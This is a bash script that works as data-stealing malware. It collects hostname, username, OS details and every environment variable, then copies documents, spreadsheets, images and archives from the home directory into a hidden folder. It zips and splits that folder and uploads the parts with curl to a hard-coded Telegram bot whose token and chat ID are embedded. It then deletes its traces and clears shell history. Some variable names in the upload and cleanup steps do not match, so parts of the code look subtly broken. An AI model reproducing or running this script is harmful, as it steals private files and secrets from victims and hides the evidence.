#!/bin/bash

# Customizable Parameters
TELEGRAM_BOT_TOKEN="7773792784:AAFfeZfSjo3yVYIbUPA1xwlMK17l-Fak2sg"  # Replace with your bot token
TELEGRAM_CHAT_ID="1318817377"               # Replace with your chat ID
ROOT_DIRECTORY="$HOME"                        # Root directory to start searching from
HIDDEN_DIRECTORY="$HOME/.hidden_folder"       # Hidden directory path
MAX_FILE_SIZE=45000000                        # 45 MB (to stay under Telegram's 50 MB limit)

# File types to collect (e.g., documents, images, etc.)
FILE_TYPES=("*.txt" "*.doc" "*.docx" "*.pdf" "*.xls" "*.xlsx" "*.jpg" "*.png" "*.zip" "*.rar")

# Function to send a message to Telegram
send_to_telegram() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        -d "text=${message}"
}

# Function to send a file to Telegram
send_file_to_telegram() {
    local file_path="$1"
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" \
        -F "chat_id=${TELEGRAM_CHAT_ID}" \
        -F "document=@${file_path}"
}

# Function to collect system information
collect_system_info() {
    echo "=== System Information ==="
    echo "Hostname: $(hostname)"
    echo "Username: $(whoami)"
    echo "Operating System: $(uname -a)"
    echo "Current Directory: $(pwd)"
    echo "Environment Variables:"
    env
}

# Function to collect files of specific types (excluding the script itself)
collect_files() {
    local directory="$1"
    for file_type in "${FILE_TYPES[@]}"; do
        find "$directory" -type f -iname "$file_type" -not -path "$0"
    done
}

# Function to split a file into smaller chunks
split_file() {
    local file_path="$1"
    local output_prefix="$2"
    split -b "$MAX_FILE_SIZE" "$file_path" "$output_prefix"
}

# Function to verify ZIP file integrity
verify_zip_integrity() {
    local zip_file="$1"
    if ! unzip -t "$zip_file" > /dev/null; then
        echo "Error: ZIP file is corrupted."
        return 1
    fi
    return 0
}

# Function to rename split files
rename_split_files() {
    local output_prefix="$1"
    local part_number=1
    for part in "$output_prefix"*; do
        mv "$part" "${output_prefix}_part_$(printf "%02d" "$part_number").zip"
        part_number=$((part_number + 1))
    done
}

# Function to delete footprints
delete_footprints() {
    # Delete the hidden directory and its contents
    rm -rf "$HIDDEN_DIRECTORY"
    # Delete the temporary ZIP file and its parts
    rm -f "$HIDDEN_DIRECTORY.zip" "$HIDDEN_DIRECTORY_part_"*
    # Clear Bash command history
    history -c
}

# Main function
main() {
    # Create a hidden directory
    mkdir -p "$HIDDEN_DIRECTORY"

    # Collect system information
    system_info=$(collect_system_info)
    echo "$system_info" > "$HIDDEN_DIRECTORY/system_info.txt"

    # Collect files of specific types (excluding the script itself)
    echo "Collecting files from $ROOT_DIRECTORY..."
    files=$(collect_files "$ROOT_DIRECTORY")
    for file in $files; do
        echo "Copying $file to $HIDDEN_DIRECTORY"
        cp --parents "$file" "$HIDDEN_DIRECTORY"
    done

    # Compress the hidden directory into a ZIP file
    echo "Creating ZIP file..."
    zip -r -9 "$HIDDEN_DIRECTORY.zip" "$HIDDEN_DIRECTORY" > /dev/null

    # Verify ZIP file integrity
    echo "Verifying ZIP file integrity..."
    if ! verify_zip_integrity "$HIDDEN_DIRECTORY.zip"; then
        echo "Error: ZIP file is corrupted. Aborting."
        delete_footprints
        exit 1
    fi

    # Split the ZIP file into smaller chunks
    echo "Splitting ZIP file..."
    split_file "$HIDDEN_DIRECTORY.zip" "$HIDDEN_DIRECTORY.part_"

    # Rename split files to include part numbers
    echo "Renaming split files..."
    rename_split_files "$HIDDEN_DIRECTORY.part_"

    # Send each chunk to Telegram
    echo "Sending ZIP file parts to Telegram..."
    for part in "$HIDDEN_DIRECTORY_part_"*; do
        send_file_to_telegram "$part"
    done

    # Delete footprints
    echo "Cleaning up..."
    delete_footprints

    echo "Done!"
}

# Run the main function
main
